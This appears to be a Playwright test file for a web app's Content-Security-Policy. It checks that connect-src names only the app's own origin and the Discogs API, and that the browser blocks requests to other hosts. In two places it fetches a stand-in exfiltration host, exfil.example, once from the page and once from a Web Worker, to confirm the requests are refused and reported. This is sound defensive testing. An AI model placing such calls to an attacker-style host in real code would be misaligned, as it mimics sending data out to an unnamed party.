import { expect, test } from './support/test'

/**
 * The Content-Security-Policy, as the browser applies it (#204).
 *
 * `connect-src` is a host list: a script in the origin cannot send anything
 * to a host the build did not name — not from the page, not from a worker.
 * And every other spec fails on a violation (support/test.ts), so a host the
 * app needs and the policy forgets shows up there.
 */
test('the preview sends the policy', async ({ page }) => {
  const response = await page.goto('/')
  const csp = response?.headers()['content-security-policy'] ?? ''
  expect(csp).toContain("connect-src 'self' https://api.discogs.com")
  expect(csp).not.toMatch(/connect-src[^;]* https:[ ;]/)
})

test('a host the build did not name is refused, and the refusal is caught', async ({
  page,
  cspViolations,
  browserName,
}) => {
  await page.goto('/')

  const fromPage = await page.evaluate(() =>
    fetch('https://exfil.example/page').then(
      () => 'sent',
      () => 'refused',
    ),
  )
  expect(fromPage).toBe('refused')
  await expect.poll(() => cspViolations.join('\n')).toContain('exfil.example/page')
  // Provoked on purpose; the fixture would fail the test otherwise.
  cspViolations.length = 0

  // The worker is where every Discogs request runs, and where the page's
  // own event listener hears nothing. WebKit refuses the request but sends
  // no report from a worker (measured 2026-11-01), so only Chromium can show
  // that the suite hears it.
  test.skip(browserName === 'webkit', 'WebKit sends no CSP report from a worker')
  const fromWorker = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        const source = `fetch('https://exfil.example/worker').then(() => postMessage('sent'), () => postMessage('refused'))`
        const worker = new Worker(URL.createObjectURL(new Blob([source])))
        worker.onmessage = (event) => resolve(String(event.data))
      }),
  )
  expect(fromWorker).toBe('refused')
  await expect.poll(() => cspViolations.join('\n')).toContain('exfil.example/worker')
  cspViolations.length = 0
})
